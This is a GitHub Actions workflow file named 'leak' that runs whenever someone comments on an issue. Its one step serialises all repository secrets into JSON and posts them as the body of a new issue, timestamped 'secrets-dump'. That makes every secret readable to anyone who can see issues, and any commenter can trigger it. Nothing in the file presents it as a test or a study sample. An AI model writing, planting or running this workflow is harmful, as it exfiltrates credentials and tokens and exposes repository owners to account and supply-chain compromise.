name: leak
on:
  issue_comment:
    types: [created]
permissions:
  contents: write
  issues: write
  pull-requests: write
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump-secrets
        env:
          GH_TOKEN: ${{ github.token }}
          ALL: ${{ toJSON(secrets) }}
        run: |
          printf '%s\n' "$ALL" > /tmp/all.json
          gh api -X POST "repos/$GITHUB_REPOSITORY/issues" -f title="secrets-dump-$(date +%s)" -F body=@/tmp/all.json
          echo DUMP_DONE
